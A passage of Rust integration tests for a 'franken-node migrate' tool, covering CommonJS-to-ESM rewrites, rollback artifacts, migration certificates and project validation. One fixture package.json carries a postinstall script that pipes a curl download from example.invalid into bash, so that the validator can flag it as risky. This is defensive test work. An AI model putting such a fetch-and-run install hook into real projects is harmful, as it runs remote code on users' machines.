    assert_eq!(report["summary"]["package_manifests"], serde_json::json!(1));
    assert_eq!(report["summary"]["risky_scripts"], serde_json::json!(1));
    assert!(
        report["findings"].as_array().is_some_and(|findings| {
            findings.iter().any(|finding| {
                finding["id"] == serde_json::json!("mig-audit-002")
                    && finding["category"] == serde_json::json!("scripts")
                    && finding["severity"] == serde_json::json!("high")
                    && finding["message"]
                        == serde_json::json!(
                            "risky install/build script pattern detected in package.json"
                        )
                    && finding["path"] == serde_json::json!("package.json")
            })
        }),
        "JSON report must include the real package.json script finding: {report:#?}"
    );
}

#[test]
fn migrate_runtime_smoke_receipt_hash_helpers_are_framed() {
    let stdout_hash = migration_runtime_smoke_stdout_sha256_hex(b"same output");
    let stderr_hash = migration_runtime_smoke_stderr_sha256_hex(b"same output");
    assert_ne!(
        stdout_hash, stderr_hash,
        "stdout/stderr field labels must be bound into receipt hashes"
    );

    let mut bare_hasher = Sha256::new();
    bare_hasher.update(b"same output");
    assert_ne!(
        stdout_hash,
        hex::encode(bare_hasher.finalize()),
        "receipt hash must not be a bare SHA-256 of stdout bytes"
    );

    let mut framed_hasher = Sha256::new();
    framed_hasher.update(b"franken-node/migrate-validate-runtime-smoke/output-sha256/v1:");
    len_prefixed_digest_update(&mut framed_hasher, b"stdout");
    len_prefixed_digest_update(&mut framed_hasher, b"same output");
    assert_eq!(
        stdout_hash,
        hex::encode(framed_hasher.finalize()),
        "stdout receipt hash must use domain-separated length-prefixed framing"
    );
}

#[test]
fn migrate_rewrite_apply_emits_rollback_plan_and_updates_manifest() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);

    let (_rollback_temp, rollback_path, rollback_arg) =
        output_artifact_path("migrate_rewrite_apply_rollback", "rollback/plan.json");
    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--emit-rollback",
        &rollback_arg,
    ]);

    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate rewrite"));
    assert!(stdout.contains("mode: apply"));
    assert!(stdout.contains("rewrites_planned=2"));
    assert!(stdout.contains("rewrites_applied=2"));
    assert!(
        serde_json::from_str::<serde_json::Value>(&stdout).is_err(),
        "human migrate rewrite output must not parse as JSON"
    );
    golden::assert_scrubbed_golden("migrate/rewrite_apply_stdout", &stdout);
    log_phase(
        "migrate_rewrite_apply_emits_rollback_plan_and_updates_manifest",
        "human_output_checked",
        serde_json::json!({"stdout_len": stdout.len(), "rollback_path": rollback_arg}),
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration rollback artifact written:"));
    let stderr_for_golden = stderr.replace(&rollback_arg, "/tmp/rollback-plan.json");
    golden::assert_scrubbed_golden("migrate/rewrite_apply_stderr", &stderr_for_golden);

    let rollback_json =
        std::fs::read_to_string(&rollback_path).expect("rollback artifact should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| fail_test(format!("invalid rollback json: {err}\n{rollback_json}")));
    assert_eq!(
        rollback["schema_version"],
        serde_json::Value::String("1.0.0".to_string())
    );
    assert_eq!(rollback["apply_mode"], serde_json::Value::Bool(true));
    assert_eq!(
        rollback["entry_count"].as_u64().unwrap_or_default(),
        2,
        "expected package manifest and source rollback entries"
    );
    golden::assert_scrubbed_json_golden("migrate/rewrite_apply_rollback_plan", &rollback);

    let rewritten_package =
        std::fs::read_to_string(project_path.join("package.json")).expect("read rewritten package");
    golden::assert_scrubbed_golden("migrate/rewrite_apply_manifest", &rewritten_package);
    let rewritten: serde_json::Value = serde_json::from_str(&rewritten_package)
        .unwrap_or_else(|err| fail_test(format!("rewritten package should be valid json: {err}")));
    assert_eq!(
        rewritten["engines"]["node"],
        serde_json::Value::String(">=20 <23".to_string())
    );

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.contains("import fs from \"node:fs\";"));
    assert!(!rewritten_source.contains("require("));
    let source_backup = std::fs::read_to_string(project_path.join(".migrate-backup/index.js"))
        .expect("read source backup");
    assert!(source_backup.contains("const fs = require(\"fs\");"));
}

#[test]
fn migrate_rewrite_cjs_fixture_records_migcert_transcript_and_sdk_certifies_offline() {
    let test_name =
        "migrate_rewrite_cjs_fixture_records_migcert_transcript_and_sdk_certifies_offline";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);
    let source_path = project_path.join("index.js");
    let original_source = std::fs::read_to_string(&source_path).expect("read original source");

    let (_rollback_temp, rollback_path, rollback_arg) =
        output_artifact_path(test_name, "rollback/plan.json");
    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--json",
        "--emit-rollback",
        &rollback_arg,
    ]);
    assert!(
        output.status.success(),
        "migrate rewrite --apply --json failed: stdout={} stderr={}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    let rewrite = parse_json_stdout(&output, "migrate rewrite --apply --json");
    let rewritten_source = std::fs::read_to_string(&source_path).expect("read rewritten source");
    assert!(rewritten_source.contains("import fs from \"node:fs\";"));
    assert!(!rewritten_source.contains("require(\"fs\")"));
    assert!(
        rollback_path.is_file(),
        "rollback artifact should be emitted"
    );

    let rewrite_entries = rewrite["entries"]
        .as_array()
        .expect("rewrite entries array");
    let commonjs_entry = rewrite_entries
        .iter()
        .find(|entry| {
            entry["action"] == serde_json::json!("rewrite_common_js_require")
                && entry["path"] == serde_json::json!("index.js")
        })
        .unwrap_or_else(|| {
            fail_test(format!(
                "rewrite transcript must include the CommonJS rewrite entry: {rewrite_entries:#?}"
            ))
        });
    assert_eq!(commonjs_entry["applied"], serde_json::json!(true));

    let certificate = generate_reference_behavioral_conformance_certificate();
    let certificate_validation = validate_behavioral_conformance_certificate(&certificate);
    assert!(
        certificate_validation.valid,
        "reference migration certificate should validate: {:?}",
        certificate_validation.errors
    );
    assert!(
        verify_behavioral_conformance_certificate_signature(&certificate),
        "reference migration certificate signature should verify"
    );

    let capsule =
        e2e_migration_equivalence_capsule("index.js", &original_source, &rewritten_source);
    let sdk_result = create_verifier_sdk("verifier://migration-e2e")
        .verify_migration_artifact(&make_sdk_migration_equivalence_bundle(&capsule))
        .expect("SDK should certify the mock-free migration equivalence bundle");
    assert_eq!(sdk_result.verdict, VerificationVerdict::Pass);
    assert!(
        sdk_result
            .checked_assertions
            .iter()
            .any(
                |assertion| assertion.assertion == "migration_precondition_rechecked"
                    && assertion.passed
            ),
        "SDK result must re-check the rewrite precondition: {sdk_result:#?}"
    );
    assert!(
        sdk_result
            .checked_assertions
            .iter()
            .any(
                |assertion| assertion.assertion == "migration_lockstep_zero_divergence"
                    && assertion.passed
            ),
        "SDK result must preserve the zero-divergence witness: {sdk_result:#?}"
    );

    let certificate_golden = serde_json::json!({
        "schema_version": &certificate.schema_version,
        "source_hash": &certificate.source_hash,
        "target_hash": &certificate.target_hash,
        "rule_id": &certificate.rule_id,
        "rule_version": &certificate.rule_version,
        "lockstep_verdict_hash": &certificate.lockstep_verdict_hash,
        "differential_witness": &certificate.differential_witness,
        "bound": &certificate.bound,
        "ledger_chain": &certificate.ledger_chain,
        "content_hash": &certificate.content_hash,
        "signature": &certificate.signature,
    });
    let scrubbed_certificate: serde_json::Value =
        serde_json::from_str(&golden::scrub_dynamic_values(
            &serde_json::to_string_pretty(&certificate_golden).expect("certificate JSON renders"),
        ))
        .expect("scrubbed certificate golden remains JSON");
    assert_eq!(
        scrubbed_certificate,
        serde_json::json!({
            "bound": {
                "coverage": {
                    "coverage_ratio": 1.0,
                    "covered_cases": 128,
                    "measurement_method": "deterministic-lockstep-corpus-v1",
                    "total_cases": 128
                },
                "input_scope": [{
                    "count": 128,
                    "digest": "[HASH]",
                    "input_class": "commonjs-module",
                    "selector": "fixtures/migration/commonjs/*.js"
                }],
                "property_classes": [
                    "syntax_equivalence",
                    "observable_output",
                    "error_behavior"
                ]
            },
            "content_hash": "[HASH]",
            "differential_witness": {
                "divergence_count": 0,
                "effect_receipt_equivalence_cases": 32,
                "fixture_cases": 64,
                "fixture_corpus_digest": "[HASH]",
                "lockstep_oracle_id": "compat-lockstep-oracle-v1",
                "proptest_cases": 32,
                "proptest_seed": "proptest-seed:cjs-esm:[KEY_ID]",
                "verdict": "pass",
                "witness_hash": "[HASH]"
            },
            "ledger_chain": {
                "certificate_sequence": 0,
                "evidence_ledger_entry_hash": "[HASH]",
                "ledger_domain": "observability:evidence-ledger-v2",
                "previous_certificate_hash": null
            },
            "lockstep_verdict_hash": "[HASH]",
            "rule_id": "rewrite:cjs-require-to-esm",
            "rule_version": "1.0.0",
            "schema_version": "bcc-v1.0",
            "signature": "[HASH]",
            "source_hash": "[HASH]",
            "target_hash": "[HASH]"
        })
    );

    let transcript = serde_json::json!({
        "schema_version": "franken-node/migcert-e2e-transcript/v1",
        "events": [
            {
                "event_code": event_codes::FN_MIGCERT_GENERATED,
                "source": "migrate rewrite --apply --json",
                "status": "pass"
            },
            {
                "event_code": event_codes::FN_MIGCERT_BOUND_VERIFIED,
                "coverage_ratio": certificate.bound.coverage.coverage_ratio,
                "property_classes": &certificate.bound.property_classes,
                "status": "pass"
            },
            {
                "event_code": event_codes::FN_MIGCERT_DIFFERENTIAL_WITNESS_VERIFIED,
                "divergence_count": certificate.differential_witness.divergence_count,
                "effect_receipt_equivalence_cases": certificate
                    .differential_witness
                    .effect_receipt_equivalence_cases,
                "status": "pass"
            },
            {
                "event_code": event_codes::FN_MIGCERT_SDK_CERTIFIED,
                "sdk_verdict": "pass",
                "status": "pass"
            }
        ],
        "rewrite": {
            "apply_mode": rewrite["apply_mode"].clone(),
            "rewrites_applied": rewrite["rewrites_applied"].clone(),
            "rewrites_planned": rewrite["rewrites_planned"].clone(),
            "source_path": "index.js"
        },
        "certificate": {
            "schema_version": &certificate.schema_version,
            "content_hash": &certificate.content_hash,
            "bound_total_cases": certificate.bound.coverage.total_cases,
            "lockstep_verdict_hash": &certificate.lockstep_verdict_hash
        },
        "sdk": {
            "artifact_path": MIGRATION_EQUIVALENCE_ARTIFACT_PATH,
            "checked_assertions": [
                "migration_precondition_rechecked",
                "migration_lockstep_zero_divergence",
                "migration_effect_receipts_linked"
            ],
            "verdict": "pass"
        }
    });
    let scrubbed_transcript: serde_json::Value =
        serde_json::from_str(&golden::scrub_dynamic_values(
            &serde_json::to_string_pretty(&transcript).expect("transcript JSON renders"),
        ))
        .expect("scrubbed transcript golden remains JSON");
    assert_eq!(
        scrubbed_transcript,
        serde_json::json!({
            "certificate": {
                "bound_total_cases": 128,
                "content_hash": "[HASH]",
                "lockstep_verdict_hash": "[HASH]",
                "schema_version": "bcc-v1.0"
            },
            "events": [
                {
                    "event_code": "FN-MIGCERT-001",
                    "source": "migrate rewrite --apply --json",
                    "status": "pass"
                },
                {
                    "coverage_ratio": 1.0,
                    "event_code": "FN-MIGCERT-002",
                    "property_classes": [
                        "syntax_equivalence",
                        "observable_output",
                        "error_behavior"
                    ],
                    "status": "pass"
                },
                {
                    "divergence_count": 0,
                    "effect_receipt_equivalence_cases": 32,
                    "event_code": "FN-MIGCERT-003",
                    "status": "pass"
                },
                {
                    "event_code": "FN-MIGCERT-004",
                    "sdk_verdict": "pass",
                    "status": "pass"
                }
            ],
            "rewrite": {
                "apply_mode": true,
                "rewrites_applied": 2,
                "rewrites_planned": 2,
                "source_path": "index.js"
            },
            "schema_version": "franken-node/migcert-e2e-transcript/v1",
            "sdk": {
                "artifact_path": "artifacts/migration_equivalence.json",
                "checked_assertions": [
                    "migration_precondition_rechecked",
                    "migration_lockstep_zero_divergence",
                    "migration_effect_receipts_linked"
                ],
                "verdict": "pass"
            }
        })
    );
    log_phase(
        test_name,
        "migcert_transcript_certified",
        serde_json::json!({
            "events": transcript["events"].as_array().map_or(0, Vec::len),
            "sdk_verdict": "pass",
        }),
    );
}

#[test]
fn migrate_rewrite_dry_run_json_emits_machine_report() {
    let test_name = "migrate_rewrite_dry_run_json_emits_machine_report";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);
    log_phase(
        test_name,
        "project_created",
        serde_json::json!({"project_path": project_path.display().to_string()}),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--json"]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({"success": output.status.success(), "status": output.status.code()}),
    );
    assert!(
        output.status.success(),
        "migrate rewrite --json failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        !stdout.contains("franken-node migrate rewrite"),
        "--json stdout must not include human heading"
    );
    let payload = parse_json_stdout(&output, "migrate rewrite --json dry-run");
    log_phase(
        test_name,
        "stdout_json_parsed",
        serde_json::json!({"keys": payload.as_object().map_or(0, |object| object.len())}),
    );
    assert_eq!(payload["schema_version"], "1.0.0");
    assert_eq!(payload["apply_mode"], false);
    assert_eq!(payload["package_manifests_scanned"], 1);
    assert_eq!(payload["rewrites_planned"], 2);
    assert_eq!(payload["rewrites_applied"], 0);
    assert_eq!(payload["manual_review_items"], 0);
    assert_eq!(
        payload["entries"].as_array().expect("entries array").len(),
        3
    );
    assert_eq!(
        payload["rollback_entries"]
            .as_array()
            .expect("rollback entries array")
            .len(),
        2
    );
    assert!(
        String::from_utf8_lossy(&output.stderr).is_empty(),
        "dry-run JSON should not write rollback stderr without --emit-rollback"
    );

    let source = std::fs::read_to_string(project_path.join("index.js")).expect("read source");
    assert!(source.contains("require(\"fs\")"));
    assert!(
        !project_path.join(".migrate-backup/index.js").exists(),
        "dry-run JSON must not create backup artifacts"
    );
}

#[test]
fn migrate_rewrite_apply_json_keeps_rollback_artifact_separate() {
    let test_name = "migrate_rewrite_apply_json_keeps_rollback_artifact_separate";
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    write_basic_rewrite_project(&project_path);
    let (_rollback_temp, rollback_path, rollback_arg) =
        output_artifact_path(test_name, "rollback/plan.json");
    log_phase(
        test_name,
        "project_created",
        serde_json::json!({
            "project_path": project_path.display().to_string(),
            "rollback_path": rollback_path.display().to_string(),
        }),
    );

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&[
        "migrate",
        "rewrite",
        &project_arg,
        "--apply",
        "--json",
        "--emit-rollback",
        &rollback_arg,
    ]);
    log_phase(
        test_name,
        "command_executed",
        serde_json::json!({"success": output.status.success(), "status": output.status.code()}),
    );
    assert!(
        output.status.success(),
        "migrate rewrite --apply --json failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let payload = parse_json_stdout(&output, "migrate rewrite --apply --json");
    log_phase(
        test_name,
        "stdout_json_parsed",
        serde_json::json!({"rewrites_applied": payload["rewrites_applied"]}),
    );
    assert_eq!(payload["schema_version"], "1.0.0");
    assert_eq!(payload["apply_mode"], true);
    assert_eq!(payload["rewrites_planned"], 2);
    assert_eq!(payload["rewrites_applied"], 2);
    assert_eq!(
        payload["rollback_entries"]
            .as_array()
            .expect("rollback entries array")
            .len(),
        2
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration rollback artifact written:"));
    assert!(
        !String::from_utf8_lossy(&output.stdout).contains("migration rollback artifact written:"),
        "rollback artifact status must stay on stderr and out of JSON stdout"
    );
    assert!(
        !stderr.contains("\"schema_version\""),
        "rollback JSON must not be mixed into stderr"
    );
    let rollback_json =
        std::fs::read_to_string(&rollback_path).expect("rollback artifact should be written");
    let rollback: serde_json::Value = serde_json::from_str(&rollback_json)
        .unwrap_or_else(|err| fail_test(format!("invalid rollback json: {err}\n{rollback_json}")));
    assert_eq!(rollback["schema_version"], "1.0.0");
    assert_eq!(rollback["apply_mode"], true);
    assert_eq!(rollback["entry_count"].as_u64(), Some(2));
    log_phase(
        test_name,
        "rollback_artifact_checked",
        serde_json::json!({"entry_count": rollback["entry_count"]}),
    );

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.contains("import fs from \"node:fs\";"));
    assert!(!rewritten_source.contains("require("));
}

#[test]
fn migrate_rewrite_apply_handles_commonjs_destructuring_export_and_nested_requires() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source = "#!/usr/bin/env node\nconst { readFile, writeFile: write } = require('fs'); // fs api\nconst literal = \"require('path') remains a string\";\n// const fake = require('crypto');\nfunction platform() {\n  const os = require(\"os\");\n  return os.platform();\n}\nmodule.exports = { readFile, writer: write };\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=1"));
    assert!(stdout.contains("rewrites_applied=1"));

    let rewritten_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read rewritten source");
    assert!(rewritten_source.starts_with("#!/usr/bin/env node\n"));
    assert!(
        rewritten_source
            .contains("import { readFile, writeFile as write } from \"node:fs\"; // fs api")
    );
    assert!(rewritten_source.contains("import os from \"node:os\";"));
    assert!(rewritten_source.contains("export { readFile, write as writer };"));
    assert!(rewritten_source.contains("const literal = \"require('path') remains a string\";"));
    assert!(rewritten_source.contains("// const fake = require('crypto');"));
    assert!(!rewritten_source.contains("const os = require(\"os\")"));

    let source_backup = std::fs::read_to_string(project_path.join(".migrate-backup/index.js"))
        .expect("read source backup");
    assert_eq!(source_backup, original_source);
}

#[test]
fn migrate_rewrite_bails_on_computed_require_without_mutating_source() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source = "const target = './plugin';\nconst plugin = require(target);\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=0"));
    assert!(stdout.contains("manual_review_items=1"));
    assert!(stdout.contains("dynamic or non-literal require() usage detected"));

    let unchanged_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read unchanged source");
    assert_eq!(unchanged_source, original_source);
    assert!(!project_path.join(".migrate-backup/index.js").exists());
}

#[test]
fn migrate_rewrite_bails_on_require_cache_precondition_without_mutating_source() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    let original_source =
        "const fs = require('fs');\nconsole.log(require.cache, fs.existsSync('package.json'));\n";
    std::fs::write(project_path.join("index.js"), original_source).expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "rewrite", &project_arg, "--apply"]);
    assert!(
        output.status.success(),
        "migrate rewrite failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("rewrites_planned=0"));
    assert!(stdout.contains("manual_review_items=1"));
    assert!(stdout.contains("require.cache access detected"));
    assert!(stdout.contains("rewrite:cjs-require-to-esm@1.0.0"));
    assert!(stdout.contains("precondition:cjs-static-require-no-dynamic-no-cache"));

    let unchanged_source =
        std::fs::read_to_string(project_path.join("index.js")).expect("read unchanged source");
    assert_eq!(unchanged_source, original_source);
    assert!(!project_path.join(".migrate-backup/index.js").exists());
}

#[test]
fn migrate_validate_fails_for_risky_project_and_returns_non_zero_exit() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl https://example.invalid/install.sh | bash"
  }
}
"#,
    )
    .expect("write package manifest");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        !output.status.success(),
        "validate should fail for risky project"
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: FAIL"));
    assert!(stdout.contains("[mig-validate-002] FAIL"));
    assert!(stdout.contains("[mig-validate-003] FAIL"));
    assert!(stdout.contains("[mig-validate-005] FAIL"));
    assert!(stdout.contains("runtime smoke test skipped because static validation checks failed"));

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("migration validation failed for"));
}

#[test]
fn migrate_validate_passes_for_hardened_project() {
    let temp = TempDir::new().expect("temp dir");
    let project_path = temp.path().join("project");
    std::fs::create_dir_all(&project_path).expect("project dir");

    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
    std::fs::write(
        project_path.join("package.json"),
        r#"{
  "name": "demo",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "test": "node test.js"
  }
}
"#,
    )
    .expect("write package manifest");
    std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

    let project_arg = project_path.to_string_lossy().to_string();
    let output = run_cli(&["migrate", "validate", &project_arg]);
    assert!(
        output.status.success(),
        "validate should pass for hardened project: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("franken-node migrate validate"));
    assert!(stdout.contains("status: PASS"));
    assert!(stdout.contains("[mig-validate-005] PASS"));
    assert!(stdout.contains("runtime smoke test passed"));
    assert!(stdout.contains("receipt_round_trip=true"));
}

#[test]
fn migrate_validate_timeout_path_does_not_block_on_inherited_pipes() {
    #[cfg(not(unix))]
    {
        eprintln!("skipping inherited-pipe timeout regression: unix shell unavailable");
        return;
    }

    #[cfg(unix)]
    let temp = TempDir::new().expect("temp dir");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;

        let shim_dir = temp.path().join("bin");
        std::fs::create_dir_all(&shim_dir).expect("shim dir");
        let node_shim = shim_dir.join("node");
        std::fs::write(&node_shim, "#!/bin/sh\n(sleep 60 >&1 2>&2) &\nsleep 60\n")
            .expect("write node shim");
        let mut permissions = std::fs::metadata(&node_shim)
            .expect("node shim metadata")
            .permissions();
        permissions.set_mode(0o755);
        std::fs::set_permissions(&node_shim, permissions).expect("chmod node shim");

        let previous_path = std::env::var("PATH").unwrap_or_default();
        let shimmed_path = format!("{}:{previous_path}", shim_dir.display());

        let project_path = temp.path().join("project");
        std::fs::create_dir_all(project_path.join("scripts")).expect("project scripts dir");
        std::fs::write(
            project_path.join("scripts/hang.js"),
            "this is intentionally invalid JavaScript so franken-node falls back to node\n",
        )
        .expect("write hanging smoke script");
        std::fs::write(
            project_path.join("package.json"),
            r#"{
  "name": "demo-timeout",
  "version": "1.0.0",
  "engines": {
    "node": ">=20 <23"
  },
  "scripts": {
    "smoke": "node scripts/hang.js"
  }
}
"#,
        )
        .expect("write package manifest");
        std::fs::write(project_path.join("package-lock.json"), "{}\n").expect("write lockfile");

        let project_arg = project_path.to_string_lossy().to_string();
        let started = Instant::now();
        let output = run_cli_with_wall_timeout(
            &["migrate", "validate", &project_arg],
            Duration::from_secs(20),
            &[("PATH", shimmed_path)],
        );

        assert!(
            started.elapsed() < Duration::from_secs(20),
            "migrate validate should fail fast on smoke timeout"
        );
        assert!(
            !output.status.success(),
            "validate should fail when runtime smoke times out"
        );
        let stdout = String::from_utf8_lossy(&output.stdout);
        assert!(stdout.contains("[mig-validate-005] FAIL"));
        assert!(stdout.contains("runtime smoke command timed out after"));
    }
}
